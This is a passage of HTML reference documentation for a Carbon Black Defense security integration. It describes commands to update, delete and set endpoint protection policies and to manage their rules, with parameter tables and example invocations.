<td style="width: 161px;">name</td>
<td style="width: 542px;">A single line name for the policy</td>
</tr>
<tr>
<td style="width: 161px;">priorityLevel</td>
<td style="width: 542px;">Priority score associated with sensors assigned to this policy.</td>
</tr>
<tr>
<td style="width: 161px;">id</td>
<td style="width: 542px;">
<p>The ID of the policy to update.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">policy</td>
<td style="width: 542px;">
<p>JSON object containing the policy details.</p>
<p>Make sure a valid policy object is passed:</p>
<ol>
<li>Use the <code>get-policy</code> command to retrieve a similar policy object.</li>
<li>Use the <code style="font-size: 14px;">set-policy</code> command to re-set some of the policy's fields.</li>
<li>Use the modified object.</li>
</ol>
</td>
</tr>
</tbody>
</table>
<h5>
<br>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Command Example</h5>
<p><code>!cbd-update-policy id=21355 priorityLevel=LOW description="woot" name="boot" policy={"knownBadHashAutoDeleteDelayMs":null,"directoryActionRules":[],"rules":[],"id":-1,"sensorSettings":[{"name":"ALLOW_UNINSTALL","value":"true"},{"name":"ALLOW_UPLOADS","value":"false"},{"name":"SHOW_UI","value":"false"},{"name":"ENABLE_THREAT_SHARING","value":"true"},{"name":"QUARANTINE_DEVICE","value":"false"},{"name":"LOGGING_LEVEL","value":"NORMAL"},{"name":"QUARANTINE_DEVICE_MESSAGE","value":"Your device has been quarantined. Please contact your administrator."},{"name":"SET_SENSOR_MODE","value":"0"},{"name":"SENSOR_RESET","value":"0"},{"name":"BACKGROUND_SCAN","value":"false"},{"name":"POLICY_ACTION_OVERRIDE","value":"true"},{"value":"","name":"HELP_MESSAGE"},{"value":"false","name":"PRESERVE_SYSTEM_MEMORY_SCAN"},{"value":"false","name":"HASH_MD5"},{"name":"SCAN_LARGE_FILE_READ","value":"false"},{"name":"SCAN_EXECUTE_ON_NETWORK_DRIVE","value":"false"},{"name":"DELAY_EXECUTE","value":"false"},{"name":"SCAN_NETWORK_DRIVE","value":"false"},{"name":"BYPASS_AFTER_LOGIN_MINS","value":"0"},{"name":"BYPASS_AFTER_RESTART_MINS","value":"0"},{"name":"SHOW_FULL_UI","value":"false"},{"name":"SECURITY_CENTER_OPT","value":"false"},{"name":"CB_LIVE_RESPONSE","value":"false"},{"name":"UNINSTALL_CODE","value":"false"}],"avSettings":{"signatureUpdate":{"schedule":{"initialRandomDelayHours":4,"fullIntervalHours":0,"intervalHours":4}},"features":[{"enabled":false,"name":"SIGNATURE_UPDATE"},{"enabled":false,"name":"ONACCESS_SCAN"},{"name":"ONDEMAND_SCAN","enabled":true}],"updateServers":{"servers":[{"flags":0,"regId":null,"server":["http://updates.cdc.carbonblack.io/update"]}],"serversForOffSiteDevices":["http://updates.cdc.carbonblack.io/update"]},"apc":{"maxExeDelay":45,"riskLevel":4,"enabled":false,"maxFileSize":4},"onAccessScan":{"profile":"NORMAL"},"onDemandScan":{"profile":"NORMAL","scanCdDvd":"AUTOSCAN","scanUsb":"AUTOSCAN","schedule":{"startHour":0,"recoveryScanIfMissed":true,"days":null,"rangeHours":0}}}}</code></p>
<h5>Human Readable Output</h5>
<pre>Request Success</pre>
<p> </p>
<h3 id="h_4748523067311529924479097">Delete a policy</h3>
<hr>
<p>Deletes a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-delete-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">policyId</td>
<td style="width: 542px;">Policy ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Human Readable Output</h5>
<pre>Request Success</pre>
<p> </p>
<h3 id="h_9448239097911529924489528">Add a rule to a policy</h3>
<hr>
<p>Adds a specified rule to a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-add-rule-to-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">action</td>
<td style="width: 542px;">Rule action</td>
</tr>
<tr>
<td style="width: 161px;">operation</td>
<td style="width: 542px;">Rule operation</td>
</tr>
<tr>
<td style="width: 161px;">required</td>
<td style="width: 542px;">Rule required</td>
</tr>
<tr>
<td style="width: 161px;">id</td>
<td style="width: 542px;">Rule ID</td>
</tr>
<tr>
<td style="width: 161px;">type</td>
<td style="width: 542px;">Application type</td>
</tr>
<tr>
<td style="width: 161px;">value</td>
<td style="width: 542px;">Application value</td>
</tr>
<tr>
<td style="width: 161px;">policyId</td>
<td style="width: 542px;">Policy ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Command Example</h5>
<p><code>!cbd-add-rule-to-policy action="TERMINATE" id="7777" operation="RANSOM" required="false" type="REPUTATION" policyId="21355" value="COMPANY_BLACK_LIST"</code></p>
<h5>Human Readable Output</h5>
<pre>Request Success</pre>
<p> </p>
<h3 id="h_6282196488501529924499356">Delete a rule from a policy</h3>
<hr>
<p>Deletes a specified rule from a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-delete-rule-from-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">policyId</td>
<td style="width: 542px;">ID of the policy to delete the rule from</td>
</tr>
<tr>
<td style="width: 161px;">ruleId</td>
<td style="width: 542px;">ID of the rule to delete</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Command Example</h5>
<p><code>!cbd-delete-rule-from-policy ruleId=2 policyId=21355</code></p>
<h5>Human Readable Output</h5>
<pre>Request Success</pre>
<p> </p>
<h3 id="h_9510068399081529924508893">Update a rule in a policy</h3>
<hr>
<p>Updates a rule in a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-update-rule-in-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">action</td>
<td style="width: 542px;">Rule action</td>
</tr>
<tr>
<td style="width: 161px;">operation</td>
<td style="width: 542px;">Rule operation</td>
</tr>
<tr>
<td style="width: 161px;">required</td>
<td style="width: 542px;">Rule required</td>
</tr>
<tr>
<td style="width: 161px;">id</td>
<td style="width: 542px;">Rule ID</td>
</tr>
<tr>
<td style="width: 161px;">type</td>
<td style="width: 542px;">Application type</td>
</tr>
<tr>
<td style="width: 161px;">value</td>
<td style="width: 542px;">Application value</td>
</tr>
<tr>
<td style="width: 161px;">policyId</td>
<td style="width: 542px;">Policy ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
<h5>Command Example</h5>
<p><code>!cbd-update-rule-in-policy action="TERMINATE" id=1 operation=RANSOM policyId=21355 required=false type=REPUTATION value=COMPANY_BLACK_LIST</code></p>
<h5>Human Readable Output</h5>
<pre>Request Success</pre>
<p> </p>
<h3 id="h_936553829651529924519312">Set a policy</h3>
<hr>
<p>Sets a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-set-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">keyValue</td>
<td style="width: 542px;">
<p>A JSON object that holds key-value pairs. Key is the field path in the policy object to update with value.</p>
</td>
</tr>
<tr>
<td style="width: 161px;">policy</td>
<td style="width: 542px;">
<p>The policy to set.</p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<p>There is no context output for this command.</p>
